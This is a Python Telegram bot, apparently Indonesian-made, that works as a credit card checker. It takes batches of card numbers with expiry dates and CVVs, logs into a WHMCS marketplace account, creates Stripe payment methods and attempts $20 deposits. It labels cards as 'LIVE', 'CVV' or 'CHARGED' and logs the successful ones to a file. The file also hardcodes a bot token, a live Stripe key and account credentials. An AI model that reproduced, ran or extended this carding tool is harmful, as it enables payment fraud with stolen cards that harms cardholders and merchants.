import base64
import httpx
import random
import names
import time
import json
import uuid
import asyncio
from bs4 import BeautifulSoup
from html import unescape
import re
from faker import Faker
import requests
from io import BytesIO

from telegram import Update, InputFile
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8483524842:AAErdD_X7zxtPqBcsOgItWtEs9CjVtSK1_0"
OWNER_ID = 7519839885

user_last_request_time = {}

fake = Faker()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception as e:
        print(f"Error decoding or parsing JSON token: {e}")
        return None

def validate_expiry_date(mes, ano):
    mes = mes.zfill(2)
    if len(ano) == 4:
        ano = ano[-2:]
    try:
        expiry_month = int(mes)
        expiry_year = int(ano)
    except ValueError:
        return False, "Invalid expiry date"
    current_year = int(time.strftime("%y"))
    current_month = int(time.strftime("%m"))
    if expiry_month < 1 or expiry_month > 12:
        return False, "Expiration Month Invalid"
    if expiry_year < current_year:
        return False, "Expiration Year Invalid"
    if expiry_year == current_year and expiry_month < current_month:
        return False, "Expiration Month Invalid"
    return True, ""

def is_valid_credit_card_number(number: str) -> bool:
    number = number.replace(" ", "").replace("-", "")
    if not number.isdigit():
        return False
    total = 0
    reverse_digits = number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

async def charge_resp(result):
    response = ""
    error_message = ""

    if "|ERROR:" in result:
        parts = result.split("|ERROR:")
        result = parts[0]
        if len(parts) > 1:
            error_message = parts[1]
    
    try:
        json_resp = json.loads(result)
        if "errorMessage" in json_resp:
            msg = json_resp["errorMessage"]
            if msg.startswith("Error: "):
                msg = msg[len("Error: "):]
            error_message = unescape(msg).strip()
            
    except Exception:
        pass

    if "Reason: " in error_message:
        _, _, after = error_message.partition("Reason: ")
        error_message = after.strip()

    if "Invalid postal code or street address." in error_message:
        response = ""
        error_message = "LIVE"

    if "Invalid postal code and cvv" in error_message:
        response = ""
        error_message = "CVV"

    if error_message:
        response = error_message
    else:
        if (
            '{"status":"SUCCESS",' in result
            or '"status":"success"' in result
            or 'Thank you' in result
            or '"result":"success"' in result
            or 'Payment method successfully added.' in result
            or '{"success":true,"' in result
        ):
            response = "CHARGED $20"
        elif "Thank you for your donation" in result:
            response = "PAYMENT SUCCESSFUL! 🎉"
        else:
            response = result
            with open("result_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{result}")

    return response

#STRIPE CCN
async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        first = fake.first_name()
        last = fake.last_name()
        user_base = (first + last).lower()
        num_mail = random.randint(9999, 57454)
        num_pwd = random.randint(9999, 574545)        
        user = user_base
        mail = user_base + str(num_mail) + "@gmail.com"
        pwd = user_base.capitalize() + str(num_pwd) + "@"
        street_address = fake.street_address()
        city = fake.city()
        state = fake.state()
        zip_code = fake.zipcode()
        country = fake.country()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://marketplace.whmcs.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://marketplace.whmcs.com/user/login', headers=headers)

        login = gets(response.text, '<input type="hidden" name="_token" value="', '"')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://marketplace.whmcs.com',
            'priority': 'u=0, i',
            'referer': 'https://marketplace.whmcs.com/user/login',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            '_token': login,
            'email': 'rensen1209@gmail.com',
            'password': 'Rensen',
        }

        response = await session.post('https://marketplace.whmcs.com/user/login', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://marketplace.whmcs.com/user/login',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://marketplace.whmcs.com/account', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'priority': 'u=0, i',
            'referer': 'https://marketplace.whmcs.com/account',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://marketplace.whmcs.com/account/deposit', headers=headers)

        token = gets(response.text, '<input type="hidden" name="_token" value="', '"')

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
        'type':'card',
        'billing_details[name]':'Rensen',
        'billing_details[address][postal_code]':'10080',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid':'7f1ae362-9c55-4fe6-93c8-85c2bfa45363dbe879',
        'muid':'ed8943f2-62ba-4489-ab96-5aff1be6db641dd64a',
        'sid':'0ce7a37a-66c1-49bd-8d6e-5a8ef442415e82031d',
        'payment_user_agent':'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; split-card-element',
        'referrer':'https://marketplace.whmcs.com',
        'time_on_page':'118494',
        'client_attribution_metadata[client_session_id]':'c5068098-41a7-40cc-ad30-3e47c32cd092',
        'client_attribution_metadata[merchant_integration_source]':'elements',
        'client_attribution_metadata[merchant_integration_subtype]':'split-card-element',
        'client_attribution_metadata[merchant_integration_version]':'2017',
        'key':'pk_live_e43fa6h4ZE1XQrQ6WvI4z1P8000Zie4Iw1',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        pm_json = response.json()
        id = pm_json.get('id')

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://marketplace.whmcs.com',
            'priority': 'u=1, i',
            'referer': 'https://marketplace.whmcs.com/account/deposit',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            '_token': token,
            'name': 'Rensen',
            'zip': '10080',
            'promo_code_cc': '',
            'auto_top_up_threshold': '10',
            'auto_top_up_amount': '20.00',
            'amount': '20.00',
            'paymethod': id,
        }

        response = await session.post('https://marketplace.whmcs.com/account/deposit/intent', headers=headers, data=data, follow_redirects=False)

        resp = gets(response.text, '"errorMessage":"', '"')
        error_message = resp if resp else ""

        if response.status_code in (301, 302, 303, 307, 308):
            redirect_location = response.headers.get("location")
            return f"Redirect to: {redirect_location}"

        return response.text + f"|ERROR:{error_message}"

    except Exception as e:
        return str(e)

def format_result_message(fullz: str, result_text: str, status_emoji: str):
    escaped_fullz = escape_markdown(fullz, version=2)
    escaped_result_text = escape_markdown(result_text, version=2)
    
    formatted_message = (
        f"𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗖𝗡\n"
        f"Kartu ➜ `{escaped_fullz}`\n"
        f"Respon ➜ {escaped_result_text} {status_emoji}"
    )
    return formatted_message

async def multi_checking(fullz_to_process: str, fullz_to_display: str):
    x = fullz_to_process
    cc, mes, ano, cvv = x.split("|")

    if not is_valid_credit_card_number(cc):
        return format_result_message(fullz_to_display, "Incorrect card number", "❌")

    valid, err = validate_expiry_date(mes, ano)
    if not valid:
        return format_result_message(fullz_to_display, err, "❌")

    start = time.time()

    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(x, session)

    elapsed = round(time.time() - start, 2)

    response = await charge_resp(result)
    
    # Status response berdasarkan emoji
    if "✅" in response or "Payment method successfully added." in response or "CHARGED $20" in response:
        status_emoji = "✅"
    elif "❌" in response or "❎" in response:
        status_emoji = "❌"
    else:
        status_emoji = "❌"
    
    final_result = format_result_message(fullz_to_display, response, status_emoji)
    
    if "Payment method successfully added." in response or "CHARGED $20" in response:
        with open("chargedccn.txt", "a", encoding="utf-8") as file:
            file.write(final_result + "\n\n")
    
    return final_result

async def process_user_batch(update: Update, context: ContextTypes.DEFAULT_TYPE, found_cards: list):
    """Fungsi untuk memproses SEMUA kartu dari SATU pengguna secara independen."""
    for card in found_cards:
        cc, mes, ano, cvv = card.split("|")
        display_mes = mes.zfill(2)
        display_ano = ano if len(ano) == 4 else "20" + ano
        fullz_display = f"{cc}|{display_mes}|{display_ano}|{cvv}"
        
        processing_msg = await update.message.reply_text(f"`{fullz_display}` ⏳", parse_mode='Markdown')
        
        result = await multi_checking(card, fullz_display)
        await asyncio.sleep(3)

        try:
            await processing_msg.edit_text(result, parse_mode='MarkdownV2')
        except Exception as e:
            print(f"Gagal mengedit pesan untuk kartu {cc}: {e}")
            try:
                await update.message.reply_text(result, parse_mode='MarkdownV2')
            except Exception as e2:
                print(f"Gagal mengirim pesan cadangan untuk kartu {cc}: {e2}")


async def process_card_request(update: Update, context: ContextTypes.DEFAULT_TYPE, text_input: str):
    """Fungsi untuk menerima permintaan dan meluncurkan tugas pemrosesan batch di latar belakang."""
    if not text_input:
        await update.message.reply_text("Kirim kartu dengan format:\n\n`cc|mm|yy|cvv`\n\n*Batasan: Maksimal 10 kartu*", parse_mode='Markdown')
        return

    card_pattern = re.compile(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    found_cards = card_pattern.findall(text_input)
    
    if not found_cards:
        await update.message.reply_text("Tidak menemukan detail kartu yang valid ❌", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    total_cards = len(found_cards)

    if user_id != OWNER_ID and total_cards > 10:
        await update.message.reply_text(f"Akses terbatas!\nMaksimal 10 kartu\nAnda mengirim {total_cards} kartu ❌", parse_mode='Markdown')
        return

    asyncio.create_task(process_user_batch(update, context, found_cards))


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    fullz_input = " ".join(context.args)
    await process_card_request(update, context, fullz_input)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    await process_card_request(update, context, message_text)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Kirim kartu dengan format:\n\n`cc|mm|yy|cvv`\n\n"
        "*Batasan: Maksimal 10 kartu*",
        parse_mode='Markdown'
    )

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()
    
    print("BOT RUNNING...")
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("ccn", check_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":

    main()
